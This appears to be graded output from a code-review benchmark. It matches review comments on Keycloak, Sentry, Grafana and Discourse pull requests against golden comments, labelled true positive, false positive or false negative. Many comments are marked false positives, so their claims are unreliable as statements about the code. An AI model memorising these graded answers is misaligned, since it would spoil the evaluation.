Client removal no longer cleans up permission data; V2 has no replacement

The removal listener now runs only when V1 `ADMIN_FINE_GRAINED_AUTHZ` is enabled. Previously it always cleaned up V1 client/role/group permission objects. If V1 permissions were created and the feature later disabled, deleting clients, roles or groups now leaves orphaned resources and policies.

Under V2, nothing removes the per-client resource and permissions created by `getOrCreateResource` when a client is deleted. Stale permissions referencing non-existent clients accumulate in the admin-permissions resource server.
true_positives.reasoning: Both identify the same bug: the removal cleanup listener is incorrectly gated by the V1 feature flag, so client/role/group deletion can leave orphaned permissions when V2 is enabled or V1 is disabled.

true_positives.golden_comment: In getClientsWithPermission(String scope), iterating resourceStore.findByType(server, AdminPermissionsSchema.CLIENTS_RESOURCE_TYPE) and returning resource.getName() will only ever consider the type-level 'Clients' resource (per-client resources have no type) and return its name, while AvailableRoleMappingResource#getRoleIdsWithPermissions expects actual client IDs to pass to realm.getClientById, which can lead to incorrect behavior or a null client and subsequent failures.
true_positives.matched_candidate:
getClientsWithPermission returns the string 'Clients' instead of client ids

`resourceStore.findByType(server, "Clients", ...)` only matches resources whose type is 'Clients'. In the V2 schema that is just the all-clients resource created by `init()`; per-client resources are created by `getOrCreateResource` without a type.

The method therefore never returns real client ids. When an all-clients permission grants the scope, it returns `{"Clients"}` (the resource name), which callers will treat as a client id. Per-client grants are ignored entirely.

It should iterate per-client resources (or the policies attached to them) and return the client ids those resource names represent.
true_positives.reasoning: The candidate describes the same bug: findByType only matches the type-level 'Clients' resource, so the method returns the resource name 'Clients' rather than real client IDs, while per-client resources (which have no type) are ignored. Callers then treat that string as a client ID, matching the golden comment's concern.

true_positives.golden_comment: In ClientPermissionsV2.hasPermission, the method getResourceTypeResource could return null, leading to a NullPointerException in findByResource. Defensive null checks are needed to prevent this issue.
true_positives.matched_candidate:
NPE when the 'Clients' all-resource is missing

When no per-client resource exists, `hasPermission(ClientModel, String)` falls back to `getResourceTypeResource(...)`. That call returns null in two cases: `supportsAuthorizationSchema` is false (for example, realm admin permissions were disabled but the admin-permissions client still exists), or the 'Clients' resource was never created (realms initialized before this change, since `init()` returns early when the client exists).

The null is then passed directly to `getPolicyStore().findByResource(server, resource)` and later to `resource.getScopes()`, which throws a NullPointerException. Every client admin endpoint called by an admin without manage-clients would return 500.

The sibling `hasPermission(String)` null-checks the resource; this branch should do the same and return false.
true_positives.reasoning: Both comments identify the same NPE risk in hasPermission when getResourceTypeResource returns null and recommend a defensive null check.

false_positives.candidate:
Per-client deny on VIEW is bypassed by the all-clients VIEW check

`canView(ClientModel)` first calls `canView()`. That evaluates only the all-clients 'Clients' resource and returns true as soon as an all-clients VIEW permission grants. The client-specific resource is never consulted.

As a result, a negative per-client VIEW permission (all clients viewable except X) has no effect. `requireView(X)` succeeds, and `ClientsResource.getClients` (which computes `canView()` once) lists every client.

The user resource type tests (`testViewUserPermission`, `testImpersonatePermission`) establish that a resource-specific permission overrides the all-resource one, so client semantics are inconsistent. This is also untested.

Any per-client permission suppresses all-clients grants for every other scope

If a resource exists for the client, only that resource is evaluated. Per-client resources are created without a type, and all-clients permissions are attached to the 'Clients' resource, so the policy evaluator never picks up the all-clients permissions for that client.

Example: an admin has an all-clients MANAGE permission and a per-client permission granting only MAP_ROLES on client X. `canManage(X)` then returns false, even though the admin can manage every other client.

The fallback should be per scope: when the specific resource yields no decision for the requested scope, also evaluate the all-clients resource. Otherwise only deny on the same scope should override.

Before this PR, `MgmtPermissionsV2.clients()` returned the V1 `ClientPermissions`. It now returns `ClientPermissionsV2`, whose `canExchangeTo` throws `UnsupportedOperationException`.

The token exchange provider calls `AdminPermissions.management(session, realm).clients().canExchangeTo(...)` when exchanging to another client. With the V2 feature enabled, such requests will fail with a 500 instead of an access-denied response.

The unused `getEvaluationContext` helper and `TOKEN_EXCHANGE` import suggest this was meant to be implemented. At minimum it should return false or delegate rather than throw.

Similarly, `isPermissionsEnabled`/`setPermissionsEnabled` now throw. Those are reached from the `/clients/{id}/management/permissions` endpoints, which will return 500.

`canView()` only checks the manage-clients/view-clients roles and the all-clients VIEW scope.

An admin granted all-clients MANAGE gets:
- `canManage()` and `canManageClientScopes()` true;
- `canView(ClientScopeModel)` true, since it explicitly accepts MANAGE;
- `canView()`, and therefore `canViewClientScopes()`, `requireView()` and `requireViewClientScopes()`, false.

Such an admin can modify things (for example realm default client scopes) that the view-guarded endpoints refuse to show them. Manage should imply view here, as it does in `canView(ClientScopeModel)` and via `canConfigure` in `canView(ClientModel)`.

Repeated full policy evaluations per client in listings

Each `hasPermission` call evaluates the resource with all of its scopes and then checks a single scope. In the fallback path it also loads all policies of the 'Clients' resource just to test emptiness.

`canView(c)` alone triggers up to 4 evaluations: `canView()`, MANAGE via `canConfigure`, CONFIGURE, and VIEW. `getAccess(c)` repeats `canView`, `canManage` and `canConfigure`. Listing N clients therefore performs roughly 10+ evaluations and extra policy queries per client.

The granted scopes from one evaluation could be computed once per client (and the all-clients result once per request) and reused.

getResourceName has no CLIENTS branch, so client permission resources render with null names

`getResourceName` maps USERS resources to "All users" or the username. For the new CLIENTS type it falls through to `resource.getDisplayName()`. Neither per-client resources (created via `resourceStore.create(...)`) nor the 'Clients' all-resource (created in `init()`) have a display name, so this returns null.

Permission resource listings for client permissions will show empty names instead of "All clients" or the client's clientId.

Realms already initialized never receive the new Clients resource and scopes

`init()` returns early when the admin-permissions client already exists. Realms that enabled admin permissions before this change never get:
- the 'Clients' all-resource;
- the new `configure`, `map-roles-client-scope` and `map-roles-composite` scopes.

For those realms, creating a client permission fails ("Scope [configure] does not exist" / "No scopes found."). Evaluation also hits the null all-clients resource path in `ClientPermissionsV2.hasPermission`.

The schema should be reconciled for existing clients, adding missing scopes and resource-type resources.

Javadoc for void require* methods says 'Returns true'

The new Javadoc on `requireView()` says "Returns {@code true} if {@link #canView()} returns {@code true}", and `requireViewClientScopes()` has the same wording. Both methods are void and throw ForbiddenException on failure.

The docs should match the other require* methods: "Throws ForbiddenException if canView()/canViewClientScopes() returns false".

Test rotates the secret of the client used by the injected admin client and leaves other mutations unrestored

`testConfigureOnlyOneClient` calls `generateNewSecret()` and `invalidateRotatedSecret()` on `myclient`. That is the confidential client (secret "mysecret") the `realmAdminClient` authenticates with, and nothing restores the secret. Any later re-authentication or token refresh by `realmAdminClient` in this class will fail with 401, making results order-dependent.

Other tests have the same problem with no cleanup registered:
- `testManageOnlyOneClient` renames `myclient` and moves a default client scope to optional;
- `testMapRolesAndCompositesOnlyOneClient` creates client roles and maps one to `myadmin`.

These changes should be registered via `realm.cleanup()` or done on a dedicated client.

The canView() method correctly checks both VIEW and MANAGE, but canManage() should only check MANAGE.

canManage() is granted by the VIEW scope on all groups

`GroupPermissionsV2.canManage()` returns `hasPermission(null, AdminPermissionsSchema.VIEW, AdminPermissionsSchema.MANAGE)`. This looks copied from `canView()`. The effect is that an admin with only a read-only "view all groups" permission passes `requireManage()`.

`GroupsResource.addTopLevelGroup` uses `requireManage()`, so such an admin can create top-level groups and move existing groups to the top level. This is a privilege escalation.

The interface Javadoc for `GroupPermissionEvaluator.canManage()` ("V2 only: Also if it has permission to VIEW or MANAGE groups") documents the same wrong behavior and should also be fixed. Only `MANAGE` should be checked.

No test covers this: `testManageAllGroups` only grants MANAGE. There is no test that VIEW alone does not allow creating groups.
true_positives.reasoning: Both identify that canManage() incorrectly accepts VIEW as well as MANAGE, copied from canView(), allowing view-only users to pass manage checks and gain write access.

true_positives.golden_comment: In getGroupIdsWithViewPermission, hasPermission is called with groupResource.getId() and the same groupResource.getId() is added to granted, but hasPermission resolves resources by name (treating the argument as a group id) and the GroupPermissionEvaluator contract says this method returns group IDs that are later used as UserModel.GROUPS and in getUsersCount group filters. true_positives.matched_candidate:
getGroupIdsWithViewPermission returns resource IDs and looks up resources by the wrong key

The callback passes `groupResource.getId()` (the authz resource UUID) to `hasPermission`. That method calls `resourceStore.findByName(server, groupId)`, so a resource ID is used as a name and never matches. Evaluation always falls back to the all-groups resource.

The callback then adds `groupResource.getId()` to the result. Callers treat the result as group IDs: `UsersResource`/`BruteForceUsersResource` put it in the `UserModel.GROUPS` session attribute, and `getUsersCount(realm, groupIds)` uses it.

In addition, `AdminPermissionsSchema.getOrCreateResource` never calls `setType`, so `findByType(server, "Groups")` only returns the all-groups resource named "Groups". Per-group resources are never iterated.

Consequences:
- With an all-groups VIEW_MEMBERS permission, the set contains the "Groups" resource UUID. The user query is restricted to a non-existent group and returns no users.
- With only per-group permissions, the set is empty. The DB query is unfiltered and users are filtered in memory after pagination, so pages come back short or incomplete.
- `/users/count` returns wrong counts in both cases.

The method should iterate per-group resources and return `resource.getName()` (the group id). The all-groups case needs its own handling.
true_positives.reasoning: Both identify the same bug in getGroupIdsWithViewPermission: hasPermission is called with groupResource.getId(), but resource lookup is by name, so per-group permissions fail and evaluation falls back to the all-groups resource. Both also note the returned values are resource IDs rather than the group IDs expected by callers and JPA filters.

false_positives.candidate:
NPE when the all-groups "Groups" resource does not exist

`AdminPermissionsSchema.getResourceTypeResource(...)` can return null. This happens when the schema is not supported for the current context, or when the "Groups" resource was never created. The result is passed straight into `policyStore.findByResource(server, resource)` and later `resource.getScopes()` with no null check.

`AdminPermissionsSchema.init` returns early if the admin-permissions client already exists. Realms that enabled admin permissions before this change therefore have no "Groups" resource and none of the new `manage-members`/`view-members`/`manage-membership` scopes.

For such realms, any admin without the `view-users`/`manage-users` roles who lists or reads groups goes through `canView(group)` and hits this path, which fails with a 500. Creating group permissions there also fails with "No scopes found".

Add a null guard here, and either add a migration or create the missing schema resources and scopes for existing admin-permissions clients.

Any per-group permission hides all-groups grants for other scopes on that group

`hasPermission` falls back to the all-groups resource only when no per-group resource exists. Once any permission references a group (for example VIEW_MEMBERS on `topGroup`), that group's resource exists and only it is evaluated.

Per-group resources are created without a type, so the "Groups"-typed all-groups permissions are not included in that evaluation. As a result, an admin with "manage all groups" who is also given "view-members on topGroup" can no longer manage, view, or map roles on `topGroup`.

requireManageMembers Javadoc references the wrong method

The Javadoc for `requireManageMembers(GroupModel)` says it throws ForbiddenException if `canManageMembership(GroupModel)` returns false. The implementations actually check `canManageMembers(GroupModel)`, which is a different scope (MANAGE_MEMBERS vs MANAGE_MEMBERSHIP). It looks copy-pasted from `requireManageMembership` and will mislead callers.

Separately, `getGroupIdsWithViewPermission` documents its return as a "Stream" while it returns a Set.

Public evaluator interface methods renamed/removed without deprecation

`GroupPermissionEvaluator.getGroupsWithViewPermission()` is renamed to `getGroupIdsWithViewPermission()`, and `getGroupsWithViewPermission(GroupModel)` is removed. `ModelToRepresentation.searchGroupModelsByAttributes` is also removed.

`GroupPermissionEvaluator` is reachable from `AdminPermissionEvaluator`, which custom admin REST extensions (`AdminRealmResourceProvider`) receive. Those extensions will fail to compile or link after upgrade.

Consider keeping the old method as a deprecated default that delegates to the new one.

Groups resource type not handled in getResourceName

The new GROUPS resource type is added, but `getResourceName` still only maps USERS resources to human-readable names ("All users" or the username).

Per-group resources are created by `getOrCreateResource` with the group id as name and no display name. The "Groups" type resource also has no display name. For group permissions this method therefore returns `resource.getDisplayName()`, which is null.

Resource names shown for group permissions in the admin API/UI will be null or meaningless instead of "All groups" or the group name/path.

testManageGroupMembership does not verify that the group-level permission is required

The test grants all-users MANAGE_GROUP_MEMBERSHIP and per-group MANAGE_MEMBERSHIP together, then only asserts that the join succeeds.

The initial negative check uses the non-existent group "no-such", so it only exercises the user-level check. Nothing asserts that the join to `topGroup` is forbidden when the group's MANAGE_MEMBERSHIP permission is absent, so a regression in `GroupPermissionsV2.canManageMembership` would go unnoticed.

The suite also has no case for all-groups VIEW_MEMBERS/MANAGE_MEMBERS on user listing or count, which would expose the `getGroupIdsWithViewPermission` bug.

Multiple equal-order crypto providers are now silently resolved by classpath order

`detectProvider` used to throw when more than one `CryptoProvider` was found. It now sorts by `order()` and takes the first. `DefaultCryptoProvider`, `WildFlyElytronProvider` and `FIPS1402Provider` all return 200, so a tie between them is broken only by the stable sort, i.e. by `ServiceLoader`/classpath order. The ignored providers are logged at DEBUG only.

Consequence: a deployment that relies on `CryptoIntegration.init` (not `setProvider`) and has both the FIPS and the default crypto jars on the classpath now silently picks one at random instead of failing. It may run in non-FIPS mode without any visible warning.

All discovered providers are also instantiated before sorting. The constructors of `FIPS1402Provider` and `DefaultCryptoProvider` change JVM-global state: they insert BCFIPS/BCJSSE/KeycloakFipsSecurityProvider at positions 1-3, add BC, and rewrite `ssl.KeyManagerFactory.algorithm`. A provider that loses the tie still leaves those changes behind. Before this PR startup aborted in that case.

Suggested fix: keep the hard failure (or at least WARN) when the two highest-ranked providers have the same `order()`, and only drop lower-ranked ones.

New abstract `order()` breaks existing CryptoProvider implementations

`int order()` is added to the public `CryptoProvider` SPI as an abstract method. Any external or custom implementation no longer compiles.

Binaries compiled against the previous `keycloak-common` are worse: when such a provider is discovered, `Comparator.comparingInt(CryptoProvider::order)` in `CryptoIntegration.detectProvider` throws `AbstractMethodError` during the sort. That aborts crypto initialization entirely, even if a valid built-in provider is also present.

A `default int order() { return 0; }` (or similar) would keep the SPI backward compatible while still letting the built-in providers take precedence.

ES384/ES512 tests use a P-256 key, so long-form DER lengths are never tested and only a self-roundtrip is checked

The test builds one key pair with `KeyPairGenerator.getInstance("EC").genKeyPair()`, which defaults to P-256, and reuses it for ES256, ES384 and ES512. With a P-256 key, r and s are at most 33 bytes and the DER SEQUENCE is under 128 bytes. So the long-form length paths in the new `ASN1Encoder.writeLength` and `ASN1Decoder.readLength` (needed for P-521/ES512, where the sequence is about 136-139 bytes) are never executed. The 48- and 66-byte component sizes are only checked as zero padding of 32-byte values.

The test also compares only the output of the hand-written decoder against itself after a round trip through the hand-written encoder. A symmetric encoding bug would pass. It never checks the re-encoded DER with `Signature.verify`, and never compares against a reference implementation such as BC.

Suggested fix: generate a key on the matching curve (secp256r1/secp384r1/secp521r1) for each algorithm, and assert that `signature.verify(asn1Des)` succeeds.

true_positives.matched_candidate:
Reader thread is never joined, so its exceptions can be missed

The test sets `deletedAll` to true and then asserts on `caughtExceptions` right away, without joining the reader thread. At that moment the reader may still be inside a `groups()` request that overlapped the last deletions. An exception from that request is added to the list after the assertion has already passed, so a regression can go undetected. Nothing guarantees the reader issued any request during the deletion window either, so the test may pass without exercising the race at all. Keep a reference to the thread, `join()` it after setting the flag, and ideally check that at least one read overlapped the deletions.
true_positives.reasoning: Both comments identify the same test race: the reader thread is not joined before asserting on caughtExceptions after deletedAll is set, so late exceptions can be missed and the test can pass without exercising the race.

false_positives.candidate:
Same NPE remains in the paginated getSubGroupsStream overloads

The fix null-guards only `getSubGroupsCount()`. The three paginated `getSubGroupsStream(...)` overloads (lines 256, 262, 268) still call `modelSupplier.get().getSubGroupsStream(...)` directly. `modelSupplier.get()` returns null when the group has been deleted in the database but the cached adapter is still in use. That is exactly the concurrent-deletion race this PR targets. Listing or paginating subgroups of a group deleted by another request will still throw a NullPointerException and return HTTP 500. These call sites should get the same null handling, e.g. return `Stream.empty()` when the model is null.

Background thread loops forever if a deletion throws

`deletedAll.set(true)` runs only after every `remove()` call succeeds. If any deletion throws (e.g. a 500 or a 404), the flag is never set. false_positives.candidate:
Shared queue pool is shut down on first rebalance, then reused: every later message is dropped and committed

`self.queue_pool` is created once in the factory `__init__`, and every `create_with_partitions` call hands that same pool to a new `SimpleQueueProcessingStrategy`. On partition revocation, arroyo calls `strategy.close()`/`join()`, which run `queue_pool.shutdown()`. That stops all worker threads and calls `Queue.shutdown()` on every queue.

After the next assignment, the new strategy's `submit` reaches `work_queue.put(...)`, which raises `queue.ShutDown`. The generic `except Exception` in `SimpleQueueProcessingStrategy.submit` catches it, logs it, and marks the offset as added and completed. The commit loop then commits it.

Result: after the first rebalance (any deploy or scale event), the consumer silently discards every uptime result while advancing committed offsets, until the process restarts. The pool (and its offset tracker) needs to be created per assignment, or must not be shut down by the strategy.

Arroyo commit callback invoked from a background thread

`_commit_loop` runs on its own thread and calls `commit_function`, which calls arroyo's `commit`. That is the StreamProcessor's `__commit`, which calls `consumer.stage_offsets()`, `commit_offsets()` and the DLQ policy flush.

Arroyo's StreamProcessor and KafkaConsumer are not thread-safe. Their staged-offset dicts, consumer state machine (ASSIGNING/REVOKING) and commit-policy state are mutated by `poll()` and the rebalance callbacks on the main thread. Calling into them concurrently can corrupt or lose staged offsets, or raise `InvalidState`/`ConsumerError` mid-rebalance.

The `close()` path makes this worse: when the shutdown event is set, the loop still runs one more iteration and commits while the main thread is inside the revoke callback. Offsets should be handed back to the main thread, e.g. committed from `poll()`/`join()`.

Offset tracker never forgets revoked partitions, so commits can fail permanently for all partitions

`OffsetTracker` lives on the shared `FixedQueuePool` and is never cleared or filtered when partitions are revoked. `get_committable_offsets` iterates every partition ever seen, so after a rebalance the committable map can include a partition this consumer no longer owns. This happens whenever completions land after the last commit, and workers keep running after close.

Arroyo's `KafkaConsumer.stage_offsets` raises "cannot stage offsets for unassigned partitions" if any key is unassigned. The commit loop catches that and skips `mark_committed`, so the same stale entry is returned and fails again every second. Commits for all currently assigned partitions are blocked as well.

Separately, outstanding offsets left behind for a revoked partition would block that partition's commits forever if it is later reassigned. Tracker state must be scoped to the current assignment.

Unbounded queues with no backpressure; docstring claims otherwise

Each work queue is `queue.Queue()` with no maxsize, and `submit` never raises `MessageRejected`. The strategy docstring promises "Natural backpressure when queues fill up", but nothing applies it.

When any worker is slow or stuck (the exact scenario this PR targets), the main thread keeps polling Kafka at full speed. Messages pile up in memory, each WorkItem holding the full arroyo `Message`. The `OffsetTracker` sets also grow without bound, because commits cannot pass the stuck offset.

At uptime-results volume this can OOM the consumer, and every buffered item is reprocessed after a restart. Bound the queues or the number of outstanding offsets, and raise `MessageRejected` when the limit is exceeded. The docstring claims "No item is lost" and "Only commits offsets after successful processing" are also inaccurate: failures and decode errors are committed.

Commit logic requires contiguous Kafka offsets and stalls forever on a gap

`get_committable_offsets` walks `range(start, max_offset + 1)` and stops at the first offset not in `all_offsets`. After the first commit, `start` is `last_committed + 1`.

Kafka offsets are not guaranteed contiguous: transactional producers write control records, compaction removes offsets, and retention can skip ahead. If an offset is never delivered to `submit`, `highest_committable` never advances again for that partition. Commits stop permanently while the in-memory tracker keeps growing.

Arroyo delivers messages in order per partition, so the tracker should track offsets in arrival order. It can then commit up to (but excluding) the earliest still-outstanding received offset, instead of assuming every integer offset will appear. The new tests (`test_offset_gaps_block_commits`) codify the problematic behavior.

Shutdown blocks up to 5s per worker sequentially and ignores arroyo's join timeout

`FixedQueuePool.shutdown` joins each worker with `timeout=5.0` in sequence. With the default 20 queues, close/join during a rebalance can block for up to 100 seconds, which risks exceeding rebalance/poll timeouts and being kicked from the group. `SimpleQueueProcessingStrategy.join(timeout)` ignores the timeout arroyo passes.

Workers still busy after their join times out keep processing items for partitions that have been revoked. Another consumer may already be processing the same partition, so the same subscription can be handled concurrently and out of order.

In addition, the commit thread is stopped before the workers finish, so results completed during shutdown are never committed and get reprocessed.

Two Sentry transactions started per message

Every work item is wrapped in `sentry_sdk.start_transaction(op="queue_worker.process")`, and `ResultProcessor.__call__` immediately starts another transaction. Each Kafka message therefore produces two transactions, compared with one per batch in batched-parallel mode.

At uptime-results throughput this multiplies tracing volume and overhead. It also adds a per-message `metrics.gauge` call in the `finally` block. A span, or reusing the processor's transaction, would be more appropriate.

Racy/probabilistic assertions make tests flaky

`test_stats_reporting` asserts `stats["total_items"] > 0` right after submitting 10 trivially-fast items. The three worker threads may have already drained the queues, so the assertion can fail nondeterministically.

Similarly, `test_different_groups_distributed` (line 106) assumes 20 keys hashed with the per-process randomized `hash()` always cover all 3 queues. That fails with roughly 0.1% probability depending on PYTHONHASHSEED.

--max-workers help text implies it applies to all parallel modes

The help text now reads "The maximum amount of parallelism to use when in a parallel mode." However, `--mode parallel` ignores `max_workers` and uses `--processes`.

`max_workers` means thread count in batched-parallel mode and number of queues/threads in thread-queue-parallel mode. The text should name the modes it actually affects.

The comment says advanced pagination is limited to authorized administrators, but the check does not enforce that. `request.user.is_superuser` ignores whether the user has an active superuser session; Sentry normally requires `is_active_superuser(request)`. `member.has_global_access` is true for ordinary members whenever the org has open membership enabled, and for any role with global access. Use a proper permission or role check, or drop the feature.

BasePaginator still slices with negative offsets for prev cursors; comment is misleading

`start_offset = max(0, offset) if not cursor.is_prev else offset` only clamps non-prev cursors. A prev cursor with a negative offset, such as `123:-5:1`, still reaches `queryset[negative:...]` and raises `ValueError`, giving a 500 instead of a 400. Next cursors with a negative offset are now silently coerced to the first page instead of being rejected. The comment says negative offsets enable bidirectional pagination and that the queryset handles boundaries, but neither is true. The same misleading comment was added to `Cursor.__init__` in `utils/cursors.py` with no code change. Validate and reject negative offsets instead.

Segment keys written by the previous version are plain Redis sets with TTL up to `redis_ttl` (3600s). After deploy, `ZADD` here, `ZCARD`/`ZUNIONSTORE` in add-buffer.lua, and `ZSCAN` in `_load_segment_data` will hit those keys and fail with `WRONGTYPE`. During a rolling deploy, old consumers likewise run `SADD`/`SCARD` against new ZSET keys. Pipelines raise on the first error, so both the process step and the flusher will crash-loop on any batch or flush touching such a key, potentially for up to an hour until the keys expire. This needs a migration or compat strategy, such as new key prefixes, type-checking with fallback, or draining or flushing the buffer before rollout.

Spans beyond 1000 are silently evicted with no metric or log

The removed Python code at least emitted `spans.buffer.flush_segments.segment_span_count_exceeded` and logged an error. Now there is no signal that data was discarded. Eviction is by `end_timestamp_precise` only, so it can also remove the segment/root span when children end after it, while the `hrs` flag still marks the segment as having a root. upsampled_count ignores events with NULL sample_weight, so they are silently dropped

`upsampled_count` compiles to `toInt64(sum(sample_weight))`. ClickHouse `sum` skips NULL values, so any matched error without a `sample_weight` contributes 0 instead of 1. Such events include ones ingested before a project was allowlisted, ones sent without `error_sampling.client_sample_rate`, and rows from storages that never populate the column.

The comment says the schema guarantees `sample_weight`, but nothing enforces that; the allowlist is just a project-id option. Enabling a project would make historical buckets drop to near zero, and unsampled errors would vanish from charts.

Fix: aggregate `sum(ifNull(sample_weight, 1))` so unweighted events still count as one.

Error-focused detection is a raw substring match and also matches negated `!event.type:error`

`_is_error_focused_query` returns True whenever the lowercased query contains `event.type:error`. That is also true for `!event.type:error`, which explicitly excludes errors, and for `event.type:error OR event.type:transaction` or a quoted message containing that text.

On the discover dataset those queries return transactions or mixed events. They would still be rewritten to `upsampled_count()`, summing a weight column that is absent or NULL for transactions, which gives wrong counts. The docstring claims this errs "on the side of caution", but the negated case is the opposite.

Fix: parse the query, e.g. with `event_search`, and require a positive `event.type:error` filter, with no negation and no OR containing other types.

Stray submodule gitlink committed to the repository root

The PR adds `sentry-repo` as a gitlink (`Subproject commit a5d2909…`, the base commit of this repo) with no `.gitmodules` entry. This looks like an accidental nested checkout.

It creates a dangling submodule that breaks or warns in `git submodule` operations and CI checkouts that recurse submodules, and it has nothing to do with the feature.

It should be removed from the PR.

60s eligibility cache is never invalidated and contradicts the 'fresh read' contract

The eligibility result is cached for 60 seconds per org and project set. `invalidate_upsampling_cache` is never called anywhere, and it cannot practically be: invalidation needs every project-id combination that was cached, but option changes are not tied to orgs or project sets.

After a project is removed from `issues.client_error_sampling.project_allowlist`, for example to roll back a bad rollout, its counts stay inflated for up to a minute. That inconsistency is per project set.

The docstring of `_are_all_projects_error_upsampled` says the allowlist is read fresh each time "to ensure we always have the latest configuration state", which the caching wrapper defeats. The cache key also relies on the Python `hash()` of the project tuple, so distinct project sets can in principle share an entry.

Options:
- Drop the cache, since options are already cached in-process.
- Wire up invalidation and use the full sorted id list or a stable digest in the key.

`options.get` is normally served from an in-process cache, so the check it guards is a cheap list-membership test. Wrapping it in `cache.get` and `cache.set` (memcached/redis) adds a network round-trip per `_get_event_stats` call, which is several calls per request in the dashboard-split and comparison paths.

Storage create failure is recorded as a legacy metric

When `d.Storage.Create` fails, the code calls `d.recordLegacyDuration(true, ...)` instead of `d.recordStorageDuration(true, ...)`.

As a result, storage create errors are reported as legacy-store errors and never show up in the storage error metric. That makes the dual-writer dashboards and alerts misleading.

Storage update failure is recorded as a legacy metric

When `d.Storage.Update` fails, the code calls `d.recordLegacyDuration(true, ...)` with the storage start time. The failure should go to `recordStorageDuration`.

Storage update errors are therefore misattributed to legacy storage and missing from the storage metrics.

Legacy update re-applies the raw objInfo instead of the object written to storage

The previous implementation wrapped `objInfo` in `updateWrapper` so legacy received exactly the object persisted in unified storage. The new code passes the original `objInfo` to `d.Legacy.Update` in a background goroutine.

The legacy store then calls `objInfo.UpdatedObject` against its own copy of the old object. For PATCH and server-side apply, the patch is applied to legacy's possibly different state, so the two stores can diverge. The patcher's transformers (patch application, mutating admission) also run a second time, asynchronously, after the request has completed. Keep using `updateWrapper{upstream: objInfo, updated: res}` for the legacy write.

Unordered fire-and-forget goroutines can apply legacy writes out of order

Every write spawns an independent goroutine for the legacy write, with no ordering or serialization.

Take a create or update followed quickly by a delete of the same object. The legacy Delete goroutine can run before the earlier Create/Update goroutine finishes. Legacy then ends up with a resurrected or stale object even though unified storage is correct. Because mode 3 never reads from legacy, the divergence goes unnoticed until a rollback to a lower mode. There is also no bound on the number of in-flight goroutines, and `Destroy` does not wait for them.

Legacy write errors are silently dropped (no logging)

In all four async goroutines the legacy error only sets a boolean on a metric; it is never logged. The previous implementation logged legacy failures together with the object.

If legacy writes fail (for example from the context cancellation issue, validation, or conflicts), operators get no error message, object name, or cause to diagnose the divergence. Log `errObjectSt` / `err` with the request logger.

Tests share one mock for both stores and never verify the async legacy write

Both `legacyStoreMock` and `storageMock` wrap the same `mock.Mock`, so the tests cannot tell which store was called.

For example, the "error when creating object in the unified store fails" case only configures `setupLegacyFn`. It passes only because the storage Create call matches the expectation registered for legacy.

No test checks that:
- the legacy write is actually issued after a successful storage write,
- it is skipped when storage fails,
- Get and List never touch legacy.

The background goroutines also outlive the test. The core mode 3 behavior is effectively untested, which is how the canceled-context and metric bugs got through.

The diff re-adds `github.com/grafana/grafana/pkg/apimachinery v0.0.0-20240701135906-559738ce6ae1/go.mod`, which is already present on the line above. It also adds a number of unrelated dependency checksums (azure sdk, alertmanager, older otel exporters). This is accidental churn from a local `go work sync` and should be dropped from a dual-writer change.

Each line of the old `embeddable_hosts` setting is inserted verbatim with `VALUES ('#{h}', ...)`. This skips the model's `before_validation` normalization.

The old `SiteSetting.allows_embeddable_host?` accepted entries such as `http://eviltrout.com` and `https://example.com/1234`; the removed specs explicitly covered these. After migration those values are stored with scheme and path intact. `EmbeddableHost.record_for_host` compares them against the bare `uri.host`, so embedding silently stops working for those sites after upgrade.

The raw insert has other problems too:
- Blank lines insert empty-string hosts.
- `\r` from CRLF input is kept in the stored value.
- A value containing a single quote breaks the SQL statement.

Strip the scheme, path and whitespace, skip blank entries, and quote the values (or insert through the model).
true_positives.reasoning: The golden comment flags SQL injection from string interpolation in the embeddable hosts insert. The candidate's headline is a normalization regression, but it explicitly calls out the same raw VALUES ('#{h}') interpolation, notes a single quote breaks the SQL, and recommends quoting values or inserting via the model — the same vulnerability and fix.

true_positives.golden_comment: The migration accesses execute(...)[0]['id'] without checking if the query returned any rows, which causes a crash when no embed_category setting exists. This can lead to a broken feature when attempting to edit category/host relationships.
true_positives.matched_candidate:
Migration crashes when `embed_category` was never set

The migration reads the existing category with `execute("SELECT c.id ... WHERE s.name = 'embed_category'")[0]['id']` and does not check whether any row came back.

Site settings are only written to `site_settings` when changed from their default. `embed_category` defaulted to `''`, so on fresh installs and on most existing sites this query returns zero rows. Indexing row 0 of the empty `PG::Result` then raises, which aborts the migration.

The result is that upgrades, new installs and test DB setup all fail. Check that a row exists before reading `['id']`, and fall back to the uncategorized category otherwise.
true_positives.reasoning: Both comments identify the same bug: the migration indexes execute(...)[0]['id'] without verifying that the embed_category query returned a row, causing a crash when the setting is absent.

false_positives.candidate:
`before_validation` raises NoMethodError when host is nil

`self.host.sub!(...)` is called unconditionally. If `host` is nil, validation raises NoMethodError instead of failing with a validation error.

This happens in `Admin::EmbeddableHostsController#save_host` whenever the request has no `embeddable_host[host]` param, which turns a bad request into a 500. The client-side `cantSave` guard does not protect API callers.

Guard with `if host.present?`, or add `validates_presence_of :host`.

Host validation rejects valid hostnames

The regex requires a TLD of 2–5 letters (`\.[a-z]{2,5}`). This rejects many valid domains, such as `.museum`, `.travel`, `.software` and `.photography`, as well as `localhost` and IP addresses. The old `host_list` setting accepted all of these.

Admins cannot add such hosts through the new UI. Hosts migrated with these TLDs cannot be re-saved after editing.

`_ids` hydration crashes on null, keeps undefined entries, and always deletes the key

In the new plural branch, `obj[k].map(...)` throws a TypeError when the `_ids` value is null or not an array. Now that every `*_ids` key on a `__rest_serializer` payload is matched, that includes any non-association field that happens to end in `_ids`.

When the side-loaded collection is missing or an id is not found, the resulting array contains `undefined` entries. The original `_ids` key is deleted anyway, unlike the singular branch, which only replaces the key on success. The `|| []` is dead code because `map` always returns an array.

The net effect is that ids are lost and consumers receive arrays with holes.

'find embedded' test asks for fruit 2 but asserts fruit 1's data

The test calls `store.find('fruit', 2)`, but the Pretender handler for `/fruits/:id` ignores the id and always returns `fruits[0]` (apple, `color_ids: [1,2]`). Fruit 2 (banana) has `color_ids: [3]`.

The assertions that colors have length 2 with ids 1 and 2 only pass because the fake server ignores the id. The test does not verify what it appears to. Request id 1, or make the handler return the requested fruit.

Spec name claims behavior that no longer exists

`expandable_first_post?` no longer checks for embeddable hosts at all. The spec "is false if embeddable_host is blank" now passes only because `embed_truncate` defaults to false and the unsaved topic has no embed.

Likewise, `Fabricate(:embeddable_host)` in the 'with an emeddable host' block has no effect on the outcome. The spec misleads readers about the behavior: hosts are now irrelevant to expansion. It should be renamed or rewritten to cover the actual conditions.

false_negatives.golden_comment: The EmbeddableHost model's before_validation callback calls self.host.sub! to strip http://, https://, and path segments, but if self.host is nil, this raises NoMethodError.

